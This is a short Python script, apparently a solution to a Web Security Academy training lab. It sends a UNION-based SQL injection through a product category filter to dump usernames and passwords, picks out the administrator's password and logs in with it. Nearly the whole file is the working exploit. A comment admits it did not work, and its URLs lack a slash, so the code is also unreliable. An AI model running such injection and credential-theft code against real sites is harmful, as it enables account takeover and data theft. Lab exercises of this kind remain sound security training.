#Could not get this one to retrive passcode. Performed this level manually

import requests
from bs4 import BeautifulSoup

s = requests.Session()

site = 'ace61f1d1e27f7a9c08c8c04007c0072.web-security-academy.net'

url= f'https://{site}'
login_url= f'https://{site}login'

resp = s.get(url)

def try_category(category_string):
    url = f'https://{site}filter?category={category_string}'
    resp = s.get(url)

    soup = BeautifulSoup(resp.text,'html.parser')
    user_table = soup.find('table').find_all('tr')
    admin_entry = [r.find('td').contents for r in user_table if 'administrator' in r.find('th')]
    admin_password = admin_entry.pop().pop()
    
    resp = s.get(login_url)
    soup = BeautifulSoup(resp.text,'html.parser')
    csrf = soup.find('input', {'name':'csrf'}).get('value')
    logindata = {
        'csrf' : csrf,
        'username' : 'administrator',
        'password' : admin_password
    }
    resp = s.post(login_url, data=logindata)
    soup = BeautifulSoup(resp.text,'html.parser')
    print(soup)


try_category("""Accessories' UNION SELECT username, password FROM users -- """)
